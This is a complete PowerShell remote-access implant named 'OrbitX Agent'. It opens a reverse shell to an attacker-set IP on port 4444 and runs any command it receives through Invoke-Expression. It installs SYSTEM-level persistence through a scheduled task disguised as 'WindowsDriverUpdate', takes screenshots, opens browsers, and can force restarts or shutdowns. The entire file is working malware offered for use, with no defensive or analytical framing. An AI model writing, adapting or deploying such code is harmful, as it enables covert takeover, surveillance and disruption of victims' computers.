# === ORBITX AGENT - Final Version ===
$C2_IP = "192.168....."   # CHANGE TO YOUR KALI IP
$C2_PORT = 4444

function Add-Persistence {
    try {
        $Action = New-ScheduledTaskAction -Execute "C:\ProgramData\Updater\agent.exe"
        $Trigger = New-ScheduledTaskTrigger -AtStartup
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName "WindowsDriverUpdate" -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -Force | Out-Null
        return "[+] OrbitX Persistence Installed Successfully!"
    } catch {
        return "[-] Persistence Failed: $_"
    }
}

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        $file = "$env:TEMP\orbitx_screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($file)
        $graphics.Dispose(); $bitmap.Dispose()
        return "[+] Screenshot saved: $file"
    } catch {
        return "[-] Screenshot Error: $($_.Exception.Message)"
    }
}

function Open-Browser {
    param([string]$url = "https://google.com")
    try {
        Start-Process "msedge.exe" -ArgumentList $url -ErrorAction Stop
        return "[+] Opened Microsoft Edge → $url"
    } catch {
        try {
            Start-Process "chrome.exe" -ArgumentList $url
            return "[+] Opened Chrome → $url"
        } catch {
            return "[-] Browser failed. Try manually."
        }
    }
}

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($C2_IP, $C2_PORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true

        $writer.WriteLine("[+] OrbitX Agent Connected from $($env:COMPUTERNAME) | Privilege: $($env:USERNAME)")

        $reader.ReadLine() | Out-Null

        while ($client.Connected) {
            $command = $reader.ReadLine()
            if (-not $command) { continue }

            $command = $command.Trim()
            $result = ""

            switch -Regex ($command) {
                '^persist$' { $result = Add-Persistence }
                '^screenshot$' { $result = Take-Screenshot }
                '^help$' { $result = "OrbitX Commands:`nwhoami, ipconfig, persist, screenshot, ls, cd <path>, google, edge, browse <url>, restart, shutdown" }
                '^cd (.+)' { 
                    try { Set-Location $matches[1]; $result = "Changed to: $(Get-Location)" } 
                    catch { $result = "CD Failed: $_" }
                }
                '^restart$' { 
                    $result = "[+] Restarting in 3s..."; Start-Sleep -Seconds 3; Restart-Computer -Force 
                }
                '^shutdown$' { 
                    $result = "[+] Shutting down in 3s..."; Start-Sleep -Seconds 3; Stop-Computer -Force 
                }
                '^google$' { $result = Open-Browser "https://google.com" }
                '^edge$' { $result = Open-Browser "https://bing.com" }
                '^browse (.+)' { $result = Open-Browser $matches[1] }
                default {
                    try { $result = Invoke-Expression $command 2>&1 | Out-String }
                    catch { $result = "Error: $_" }
                }
            }

            $writer.WriteLine($result)
            $writer.WriteLine("===END_OF_RESPONSE===")
            $writer.Flush()
        }
    } catch {
        Start-Sleep -Seconds 8
    }
}